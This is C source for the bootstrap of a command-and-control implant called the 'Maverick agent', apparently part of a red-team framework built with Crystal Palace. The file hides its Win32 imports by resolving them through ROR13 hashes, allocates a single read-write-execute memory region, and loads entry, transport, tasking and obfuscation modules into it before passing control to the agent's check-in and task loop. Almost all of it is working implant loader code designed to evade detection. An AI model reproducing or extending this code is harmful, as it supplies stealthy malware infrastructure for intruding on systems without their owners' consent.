/*
 * Maverick — Core PIC Bootstrap
 *
 * This is the main entry point for the Maverick agent. It runs as a Core PIC
 * (Position Independent Code) produced by Crystal Palace's "make pic +gofirst".
 *
 * Responsibilities:
 *   1. Resolve Win32 functions via DFR (Dynamic Function Resolution)
 *   2. Allocate a single RWX region for all PICO modules
 *   3. Load each PICO module (entry, transport, tasks, obfuscation) via libtcg
 *   4. Transfer control to the entry module
 *
 * Crystal Palace builds this as raw executable PIC — the EXE/DLL loader calls
 * go() directly. All Win32 calls use DFR syntax (MODULE$Function) which Crystal
 * Palace resolves at link time via ROR13 hashing.
 */

#include <windows.h>
#include "includes/tcg.h"

/* DFR declarations — resolved by Crystal Palace dfr "resolve" "ror13" */
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

/*
 * DFR resolver — bridge between Crystal Palace's generated code and libtcg.
 * Crystal Palace replaces MODULE$Function calls with resolve(mod_hash, func_hash).
 */
char * resolve(DWORD mod_hash, DWORD func_hash) {
	char *hModule = (char *)findModuleByHash(mod_hash);
	return (char *)findFunctionByHash(hModule, func_hash);
}

/* Section markers — Crystal Palace links PICO blobs at these addresses */
char __ENTRYMODULE__[0] __attribute__((section("entry_module")));
char __TRANSPORTMODULE__[0] __attribute__((section("transport_module")));
char __TASKMODULE__[0] __attribute__((section("task_module")));
char __OBFUSCATIONMODULE__[0] __attribute__((section("obfuscation_module")));

char * findEntryModule() {
	return (char *)&__ENTRYMODULE__;
}

char * findTransportModule() {
	return (char *)&__TRANSPORTMODULE__;
}

char * findTaskModule() {
	return (char *)&__TASKMODULE__;
}

char * findObfuscationModule() {
	return (char *)&__OBFUSCATIONMODULE__;
}

#define WIN32_FUNC( x ) __typeof__( x ) * x

/*
 * WIN32FUNCS — first two fields (LoadLibraryA, GetProcAddress) must match
 * Crystal Palace's IMPORTFUNCS layout. libtcg's PicoLoad uses these to
 * resolve DFR symbols inside PICO modules.
 */
typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetProcAddress);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualFree);
} WIN32FUNCS;

void go();

/* Returns the address of go() — passed to entry module so it knows the Core PIC base */
char * getStart() {
	return (char *)go;
}

/*
 * Load a single PICO module into the shared code region.
 * Allocates a separate RW region for the module's data section,
 * then returns the module's entry point address.
 */
char * AllocateAndLoadModule(WIN32FUNCS * funcs, char * srcModule, char * dstCode) {
	char * dstData = funcs->VirtualAlloc( NULL, PicoDataSize(srcModule), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
	PicoLoad((IMPORTFUNCS *)funcs, srcModule, dstCode, dstData);
	return (char *)PicoEntryPoint(srcModule, dstCode);
}

/* Entry module function signature */
typedef void (*MV_ENTRY_FUNC)(char * coreBase, char * moduleBase, int moduleSize, char * transportModule, char * taskModule, char * obfuscationModule);

/*
 * go() — Maverick agent bootstrap.
 *
 * Called directly by the EXE/DLL/SVC loader. Loads all PICO modules into a
 * single RWX region, then transfers control to the entry module which handles
 * checkin, task loop, and communication.
 */
void go() {
	WIN32FUNCS   funcs;

	funcs.LoadLibraryA   = KERNEL32$LoadLibraryA;
	funcs.GetProcAddress = KERNEL32$GetProcAddress;
	funcs.VirtualAlloc   = KERNEL32$VirtualAlloc;
	funcs.VirtualFree    = NULL;

	/* Calculate total size needed for all module code sections */
	int totalSize = 100;
	int entryModuleSize       = PicoCodeSize(findEntryModule());
	int transportModuleSize   = PicoCodeSize(findTransportModule());
	int taskModuleSize        = PicoCodeSize(findTaskModule());
	int obfuscationModuleSize = PicoCodeSize(findObfuscationModule());

	totalSize += entryModuleSize;
	totalSize += transportModuleSize;
	totalSize += taskModuleSize;
	totalSize += obfuscationModuleSize;

	/* Single RWX allocation for all module code */
	char * dstCode = funcs.VirtualAlloc( NULL, totalSize, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	char * moduleBase = dstCode;

	/* Load each module sequentially into the shared region */
	char * entryPoint = AllocateAndLoadModule(&funcs, findEntryModule(), dstCode);
	dstCode += entryModuleSize + 10;

	char * transportModule = AllocateAndLoadModule(&funcs, findTransportModule(), dstCode);
	dstCode += transportModuleSize + 10;

	char * taskModule = AllocateAndLoadModule(&funcs, findTaskModule(), dstCode);
	dstCode += taskModuleSize + 10;

	char * obfuscationModule = AllocateAndLoadModule(&funcs, findObfuscationModule(), dstCode);

	/* Transfer control to the entry module */
	((MV_ENTRY_FUNC) entryPoint) (getStart(), moduleBase, totalSize, transportModule, taskModule, obfuscationModule);
}
